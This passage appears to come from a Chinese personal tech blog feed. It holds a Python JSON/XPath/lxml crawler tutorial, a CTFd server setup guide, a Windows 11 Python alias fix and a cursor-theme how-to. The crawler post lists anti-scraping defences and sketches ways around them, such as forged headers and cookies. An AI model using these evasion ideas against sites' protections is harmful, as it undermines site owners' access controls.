格式传递的。</p><p>简单地说，JSON 可以将 JavaScript 对象表示的一组数据转换为字符串格式，以便于在网络、程序间传输这个字符串。并且在需要的时候，您还可以将它转换为编程语言所支持的数据格式。本节主要介绍如何实现 JSON 数据与 Python 数据类型间的相互转换。</p><h3 id="json类型数据的格式"><a href="#json类型数据的格式" class="headerlink" title="json类型数据的格式"></a>json类型数据的格式</h3><p>JSON数据由键值对组成，使用大括号（{}）表示对象，使用方括号（[]）表示数组。每个键值对由一个键和一个对应的值组成，键和值之间使用冒号（:）分隔，多个键值对之间使用逗号（,）分隔。值可以是字符串、数字、布尔值、对象、数组或null。<br>以下是JSON格式的示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;John&quot;,</span><br><span class="line">    &quot;age&quot;: 30,</span><br><span class="line">    &quot;isStudent&quot;: true,</span><br><span class="line">    &quot;languages&quot;: [&quot;Java&quot;, &quot;Python&quot;, &quot;JavaScript&quot;],</span><br><span class="line">    &quot;address&quot;: &#123;</span><br><span class="line">        &quot;street&quot;: &quot;123 Main St&quot;,</span><br><span class="line">        &quot;city&quot;: &quot;New York&quot;,</span><br><span class="line">        &quot;country&quot;: &quot;USA&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;phoneNumbers&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;type&quot;: &quot;home&quot;,</span><br><span class="line">            &quot;number&quot;: &quot;555-1234&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;type&quot;: &quot;work&quot;,</span><br><span class="line">            &quot;number&quot;: &quot;555-5678&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>操作示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line"># 读取 JSON 文件</span><br><span class="line">with open(&quot;data.json&quot;, &quot;r&quot;) as file:</span><br><span class="line">    json_data = file.read()</span><br><span class="line"></span><br><span class="line"># 解析 JSON 字符串为 Python 对象</span><br><span class="line">data = json.loads(json_data)</span><br><span class="line"></span><br><span class="line"># 访问 JSON 数据</span><br><span class="line">name = data[&quot;name&quot;]</span><br><span class="line">age = data[&quot;age&quot;]</span><br><span class="line">is_student = data[&quot;isStudent&quot;]</span><br><span class="line">languages = data[&quot;languages&quot;]</span><br><span class="line">address = data[&quot;address&quot;]</span><br><span class="line">phone_numbers = data[&quot;phoneNumbers&quot;]</span><br><span class="line"></span><br><span class="line"># 修改 JSON 数据</span><br><span class="line">data[&quot;age&quot;] = 31</span><br><span class="line">data[&quot;languages&quot;].append(&quot;C++&quot;)</span><br><span class="line">data[&quot;address&quot;][&quot;country&quot;] = &quot;Canada&quot;</span><br><span class="line"></span><br><span class="line"># 将 Python 对象转换为 JSON 字符串</span><br><span class="line">updated_json_data = json.dumps(data, indent=4)</span><br><span class="line"></span><br><span class="line"># 将 JSON 字符串写入文件</span><br><span class="line">with open(&quot;updated_data.json&quot;, &quot;w&quot;) as file:</span><br><span class="line">    file.write(updated_json_data)</span><br></pre></td></tr></table></figure><h3 id="json模块的方法总结"><a href="#json模块的方法总结" class="headerlink" title="json模块的方法总结"></a>json模块的方法总结</h3><table><thead><tr><th align="center">方法</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">json.dumps()</td><td align="center">将 Python 对象转换成 JSON 字符串。</td></tr><tr><td align="center">json.loads()</td><td align="center">将 JSON 字符串转换成 Python 对象。</td></tr><tr><td align="center">json.dump()</td><td align="center">将 Python 中的对象转化成 JSON 字符串储存到文件中。</td></tr><tr><td align="center">json.load()</td><td align="center">将文件中的 JSON 字符串转化成 Python 对象提取出来。</td></tr></tbody></table><p>综上所述 json.load() 与 json.dump() 操作的是文件流对象，实现了 json 文件的读写操作，而 json.loads() 与 json.dumps() 操作的是 Python 对象或者 JOSN 字符串。</p><h2 id="xpath-语言和lxml-模块"><a href="#xpath-语言和lxml-模块" class="headerlink" title="xpath 语言和lxml 模块"></a>xpath 语言和lxml 模块</h2><p>XPath（全称：XML Path Language）即 XML 路径语言，它是一门在 XML 文档中查找信息的语言，最初被用来搜寻 XML 文档，同时它也适用于搜索 HTML 文档。因此，在爬虫过程中可以使用 XPath 来提取相应的数据。</p><h3 id="xpath语法"><a href="#xpath语法" class="headerlink" title="xpath语法"></a>xpath语法</h3><ul><li>xpath helper插件：帮助我们从elements中定位数据<ol><li>选择节点(标签):<br>&#x2F;html&#x2F;head&#x2F;meta:能够选中htm下的head下的所有的meta标签</li><li>&#x2F;&#x2F;:能够从任意节点开始选择</li></ol><ul><li>&#x2F;&#x2F;1i:当前页面上的所有的li标签</li><li>&#x2F;html&#x2F;head&#x2F;&#x2F;link:head下的所有的link标签</li><li>. : 表示当前节点</li><li>.. : 表示当前节点的父节点</li></ul><ol start="3"><li>@符号的用途:</li></ol><ul><li>选择具体某个元素：&#x2F;&#x2F;div[@class&#x3D;’feed’]&#x2F;ul&#x2F;li </li><li>选择class&#x3D;feed的div下的ul下的li</li><li>a&#x2F;@href：选择a的href的值</li></ul><ol start="4"><li>获取文本:<ul><li>&#x2F;a&#x2F;text():获取a下的文本</li><li>&#x2F;a&#x2F;&#x2F;text():获取a下的所有的文本</li></ul></li></ol></li></ul><h3 id="lxml-模块"><a href="#lxml-模块" class="headerlink" title="lxml 模块"></a>lxml 模块</h3><ol><li>导入模块: <strong>import lxml</strong></li><li>lxml模块的使用:<br>lxml 库提供了一个 etree 模块，该模块专门用来解析 HTML&#x2F;XML 文档,使用该模块来解析html&#x2F;xml文档的流程如下</li></ol><ul><li>导入<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br></pre></td></tr></table></figure></li><li>创建解析对象<br>调用 etree 模块的 HTML() 方法来创建 HTML 解析对象。如下所示:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_html = etree.HTML(html)</span><br></pre></td></tr></table></figure>HTML() 方法能够将 HTML 标签字符串解析为 HTML 文件，该方法可以自动修正 HTML 文本。示例如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">html_str = &#x27;&#x27;&#x27;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">         &lt;li class=&quot;item1&quot;&gt;&lt;a href=&quot;www.python.com&quot;&gt;Python&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item2&quot;&gt;&lt;a href=&quot;www.java.com&quot;&gt;Java&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;site2&quot;&gt;&lt;a href=&quot;www.baidu.com&quot;&gt;百度&lt;/a&gt;</span><br><span class="line">         &lt;li class=&quot;site3&quot;&gt;&lt;a href=&quot;www.jd.com&quot;&gt;京东&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">html = etree.HTML(html_str)</span><br><span class="line"># tostring()将标签元素转换为字符串输出，注意：result为字节类型</span><br><span class="line">result = etree.tostring(html)</span><br><span class="line">print(result.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>输出结果如下:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;&lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">         &lt;li class=&quot;item1&quot;&gt;&lt;a href=&quot;www.python.com&quot;&gt;Python&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item2&quot;&gt;&lt;a href=&quot;www.java.com&quot;&gt;Java&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;site2&quot;&gt;&lt;a href=&quot;www.baidu.com&quot;&gt;&amp;#30334;&amp;#24230;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;site3&quot;&gt;&lt;a href=&quot;www.jd.com&quot;&gt;&amp;#20140;&amp;#19996;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li>调用xpath表达式<br>最后使用第二步创建的解析对象调用 xpath() 方法，完成数据的提取，如下所示：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">html_str = &#x27;&#x27;&#x27;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">         &lt;li class=&quot;item1&quot;&gt;&lt;a href=&quot;www.python.com&quot;&gt;Python&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item2&quot;&gt;&lt;a href=&quot;www.java.com&quot;&gt;Java&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;site2&quot;&gt;&lt;a href=&quot;www.baidu.com&quot;&gt;百度&lt;/a&gt;</span><br><span class="line">         &lt;li class=&quot;site3&quot;&gt;&lt;a href=&quot;www.jd.com&quot;&gt;京东&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">html = etree.HTML(html_str)</span><br><span class="line"># 提取文本数据，以列表形式输出 </span><br><span class="line"># 注:xpath只能根据当前url对应的响应的来写(一般情况下element和响应的html不一样)</span><br><span class="line">result = html.xpath(&#x27;//li/a/@href&#x27;)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>输出结果为:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;www.python.com&#x27;, &#x27;www.java.com&#x27;, &#x27;www.baidu.com&#x27;, &#x27;www.jd.com&#x27;]</span><br></pre></td></tr></table></figure></li></ul><h2 id="对编写爬虫程序的一些个人见解"><a href="#对编写爬虫程序的一些个人见解" class="headerlink" title="对编写爬虫程序的一些个人见解"></a>对编写爬虫程序的一些个人见解</h2><ul><li>一般编写爬虫程序分为四步:<ul><li>第一步:初始化参数<br>url的构造,headers,cookies等的伪造 </li><li>第二步:请求<br>用requests方法去请求url,获得网页的响应</li><li>第三步:解析<br>对网页的响应进行解析,将其中需要爬取的数据提取出来（re,xpath,bs4）</li><li>第四步:保存<br>将提取出来的数据进行保存,用数据库或者文件的操作来实现</li></ul></li></ul><h2 id="关于反爬和绕过"><a href="#关于反爬和绕过" class="headerlink" title="关于反爬和绕过"></a>关于反爬和绕过</h2><p>爬虫实战中一般有许多网站有反爬虫的一些策略,需要更多的深度学习来进行绕过</p><ol><li>网站反爬虫策略主要有以下几种：</li></ol><p>基于IP的反爬虫：通过人为或部分策略来识别出爬虫的IP并进行屏蔽、阻止、封禁等操作。</p><p>基于爬行的反爬虫：在爬虫的爬行中设置爬行障碍，让其陷入死循环；或者用一些无意义的URL来填充其爬行队列，从而阻止其对正常URL进行后续的漏洞审计。</p><p>封User-Agent：User-Agent是请求头域之一，服务器从User-Agent对应的值中是被客户端的使用信息。User-Agent的角色就是客户端的身份标识。很多的爬虫请求头就是默认的一些很明显的爬虫头python-requests&#x2F;2.18.4，诸如此类，当发现携带有这类headers的数据包，直接拒绝访问，返回403错误。</p><p>封Cookie：服务器通过校验请求头中的Cookie值来区分正常用户和爬虫程序。</p><p>JavaScript渲染：由JavaScript改变HTML DOM导致页面内容发生变化的现象称为动态渲染。由于编程语言没有像浏览器一样内置JavaScript解释器和渲染引擎，所以动态渲染是天然的反爬虫手段。</p><p>验证码验证：当某一用户访问次数过多后，就自动让请求跳转到一个验证码页面，只有在输入正确的验证码之后才能继续访问网站。</p><p>Ajax异步传输：访问网页的时候服务器将网页框架返回给客户端，在与客户端交互的过程中通过异步ajax技术传输数据包到客户端，呈现在网页上，爬虫直接抓取的话信息为空。</p><p>图片伪装：将带有文字的图片与正常文字混合在一起，以达到“鱼目混珠”的效果。</p><p>CSS偏移：利用CSS样式将乱序的文字排版为人类正常阅读顺序1。</p><p>SVG映射：SVG是用于描述二维矢量图形的一种图形格式。它基于XML描述图形，对图形进行放大或缩小操作都不会影响图形质量。由于SVG中的图形代表的也是一个个文字，所以在使用时必须在后端或前端将真实的文字与对应的SVG图形进行映射和替换<br>2. 一些常见的绕过思路<br>cookie中一些参数的绕过(如:uuid)<br>用session方法</p>]]></content>
      
      
      
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfd平台搭建</title>
      <link href="/2023/07/15/ctfd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/07/15/ctfd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfd平台搭建"><a href="#ctfd平台搭建" class="headerlink" title="ctfd平台搭建"></a>ctfd平台搭建</h1><p>系统:Centos7(阿里云服务器)<br>工具:Xshell(连接云服务器)</p><h2 id="一-安装docker-compose"><a href="#一-安装docker-compose" class="headerlink" title="一.安装docker-compose"></a>一.安装docker-compose</h2><h3 id="1-下载-Docker-Compose-的当前稳定版本"><a href="#1-下载-Docker-Compose-的当前稳定版本" class="headerlink" title="1. 下载 Docker Compose 的当前稳定版本"></a>1. 下载 Docker Compose 的当前稳定版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -L &quot;https://github.com/docker/compose/releases/download/v2.2.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h3 id="2-将可执行权限应用于二进制文件-chomod命令修改权限-："><a href="#2-将可执行权限应用于二进制文件-chomod命令修改权限-：" class="headerlink" title="2.将可执行权限应用于二进制文件(chomod命令修改权限)："></a>2.将可执行权限应用于二进制文件(chomod命令修改权限)：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h3 id="3-创建软链："><a href="#3-创建软链：" class="headerlink" title="3.创建软链："></a>3.创建软链：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><h3 id="4-测试是否安装成功："><a href="#4-测试是否安装成功：" class="headerlink" title="4.测试是否安装成功："></a>4.测试是否安装成功：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose version</span><br></pre></td></tr></table></figure><p>出现如果出现版本号,则安装成功。</p><h2 id="二-开始搭建"><a href="#二-开始搭建" class="headerlink" title="二.开始搭建"></a>二.开始搭建</h2><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>备份原来的源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure><p>下载阿里云的源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure><p>生成缓存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure><p>更新源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y update</span><br></pre></td></tr></table></figure><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install -y python-pip</span><br><span class="line">yum install -y git</span><br><span class="line">yum install -y epel-release</span><br><span class="line">yum -y install python-devel</span><br></pre></td></tr></table></figure><p>升级pip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install --upgrade pip</span><br><span class="line">sudo wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">sudo python get-pip.py</span><br></pre></td></tr></table></figure><p>检验pip是否安装成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip -V</span><br></pre></td></tr></table></figure><p>出现版本号则说明成功</p><h3 id="安装flask和docker-compose"><a href="#安装flask和docker-compose" class="headerlink" title="安装flask和docker-compose"></a>安装flask和docker-compose</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure><h3 id="获取CTFd"><a href="#获取CTFd" class="headerlink" title="获取CTFd"></a>获取CTFd</h3><p>git直接部署</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/CTFd/CTFd.git</span><br></pre></td></tr></table></figure><p>进入ctfd目录下（以下操作都在此目录进行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd CTFd</span><br></pre></td></tr></table></figure><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>查看docker内核版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure><p>docker内核版本必须是3.10+以上的版本,不然会显示No package docker-ce available报错</p><p>卸载老版本docker及其依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum remove docker docker-common container-selinux docker-selinux docker-engine</span><br></pre></td></tr></table></figure><p>更新yum</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update -y</span><br></pre></td></tr></table></figure><p>安装 yum-utils，它提供了 yum-config-manager，可用来管理yum源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br></pre></td></tr></table></figure><p>添加yum源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>更新索引</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum makecache fast</span><br></pre></td></tr></table></figure><p>安装 docker-ce</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install containerd.io-1.2.6-3.3.el7.x86_64.rpm</span><br><span class="line">sudo yum install -y docker-ce</span><br></pre></td></tr></table></figure><p>启动 docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><p>验证 docker是否启动成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker info</span><br></pre></td></tr></table></figure><p>输入命令，并等待安装依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>本过程需要等待比较久的时间<br>安装好后访问服务器ip:8000<br><img src="/img/ctfd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1.png" alt="title"></p><h2 id="三-平台汉化"><a href="#三-平台汉化" class="headerlink" title="三.平台汉化"></a>三.平台汉化</h2>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决win11更新引起python一系列错误</title>
      <link href="/2023/07/14/%E8%A7%A3%E5%86%B3win11%E6%9B%B4%E6%96%B0%E5%BC%95%E8%B5%B7python%E4%B8%80%E7%B3%BB%E5%88%97%E9%94%99%E8%AF%AF/"/>
      <url>/2023/07/14/%E8%A7%A3%E5%86%B3win11%E6%9B%B4%E6%96%B0%E5%BC%95%E8%B5%B7python%E4%B8%80%E7%B3%BB%E5%88%97%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="解决win11更新引起python一系列错误"><a href="#解决win11更新引起python一系列错误" class="headerlink" title="解决win11更新引起python一系列错误"></a>解决win11更新引起python一系列错误</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><h3 id="python-v无回显（包括跑python脚本也没回显）"><a href="#python-v无回显（包括跑python脚本也没回显）" class="headerlink" title="python -v无回显（包括跑python脚本也没回显）"></a>python -v无回显（包括跑python脚本也没回显）</h3><p><img src="/img/%E8%A7%A3%E5%86%B3win11%E6%9B%B4%E6%96%B0%E5%BC%95%E8%B5%B7python%E4%B8%80%E7%B3%BB%E5%88%97%E9%94%99%E8%AF%AF/4.jpg" alt="title"></p><h3 id="python-无法导库"><a href="#python-无法导库" class="headerlink" title="python 无法导库"></a>python 无法导库</h3><p>无论用pycharm自带的导库还是用pip install 导库都报错<br><img src="/img/%E8%A7%A3%E5%86%B3win11%E6%9B%B4%E6%96%B0%E5%BC%95%E8%B5%B7python%E4%B8%80%E7%B3%BB%E5%88%97%E9%94%99%E8%AF%AF/6.png" alt="title"></p><h2 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h2><p>原因:<br>windows11的某次更新中在WindowsApp文件夹中更新了python.exe文件(一个快捷方式)</p><p>如图:<br><img src="/img/%E8%A7%A3%E5%86%B3win11%E6%9B%B4%E6%96%B0%E5%BC%95%E8%B5%B7python%E4%B8%80%E7%B3%BB%E5%88%97%E9%94%99%E8%AF%AF/1.png" alt="title"></p><p>双击打开为通过微软商店去安装python<br>如图:<br><img src="/img/%E8%A7%A3%E5%86%B3win11%E6%9B%B4%E6%96%B0%E5%BC%95%E8%B5%B7python%E4%B8%80%E7%B3%BB%E5%88%97%E9%94%99%E8%AF%AF/2.png" alt="title"></p><p>当cmd运行where python 时:</p><p><img src="/img/%E8%A7%A3%E5%86%B3win11%E6%9B%B4%E6%96%B0%E5%BC%95%E8%B5%B7python%E4%B8%80%E7%B3%BB%E5%88%97%E9%94%99%E8%AF%AF/3.png" alt="title"><br>会发现有两个python，因为上面那个快捷方式和你自己安装的python重名，导致系统识别了这个快捷方式，然后没有识别到你安装的python，从而导致了python使用时的一系列报错</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法:"></a>解决方法:</h2><p>进入到WindowsApp文件夹，将python.exe重命名或者删除（推荐python3那个文件也一起操作一遍）</p><h2 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h2><p>本人在今年三四月份自己学爬虫安装python并且使用的时候就发现了这系列问题，当时搞了三天才解决，本来是不打算写博客的(比较麻烦，要用虚拟机复现一遍)，但是周围的同学啥的装python然后使用起来都发现有这些问题，就想着发篇博客来帮帮遇到同样问题的人。具体原因为win11的今年（2023）的某次更新,目前发现2022年安装好python的用户都没有此错误，系统和ide都可以正确识别python</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win11光标美化</title>
      <link href="/2023/07/10/win11%E5%85%89%E6%A0%87%E7%BE%8E%E5%8C%96/"/>
      <url>/2023/07/10/win11%E5%85%89%E6%A0%87%E7%BE%8E%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="win11光标美化"><a href="#win11光标美化" class="headerlink" title="win11光标美化"></a>win11光标美化</h1><h2 id="资源包下载"><a href="#资源包下载" class="headerlink" title="资源包下载"></a>资源包下载</h2><h3 id="网站推荐"><a href="#网站推荐" class="headerlink" title="网站推荐"></a>网站推荐</h3><p>致美化:<a href="https://zhutix.com/tag/win11-zhuti/">https://zhutix.com/tag/win11-zhuti/</a><br>枫の主题社(偏二次元):<a href="https://winmoes.com/">https://winmoes.com/</a><br>这边推荐使用致美化，枫の主题社鼠标指针有些不太兼容</p><h3 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h3><p>进入美化网站，选择你想要的美化指针，下载压缩包，这里以蓝色鱼鳍为例<br><img src="/img/win11%E5%85%89%E6%A0%87%E7%BE%8E%E5%8C%96/1.png" alt="title"></p><p>点击下载<br><img src="/img/win11%E5%85%89%E6%A0%87%E7%BE%8E%E5%8C%96/2.png" alt="title"></p><p>将压缩包解压，并且打开解压后的文件夹<br><img src="/img/win11%E5%85%89%E6%A0%87%E7%BE%8E%E5%8C%96/3.png" alt="title"></p><p>打开第一个文件夹<br><img src="/img/win11%E5%85%89%E6%A0%87%E7%BE%8E%E5%8C%96/4.png" alt="title"></p><p>右键第一个.inf 后缀的文件,显示更多选项，然后安装。</p><p>就会出现如下界面：<br><img src="/img/win11%E5%85%89%E6%A0%87%E7%BE%8E%E5%8C%96/5.png" alt="title"></p><p>然后点击确定即可完成应用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 小功能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爆破之token绕过</title>
      <link href="/2023/07/07/%E7%88%86%E7%A0%B4token%E7%BB%95%E8%BF%87/"/>
      <url>/2023/07/07/%E7%88%86%E7%A0%B4token%E7%BB%95%E8%BF%87/</url>
      
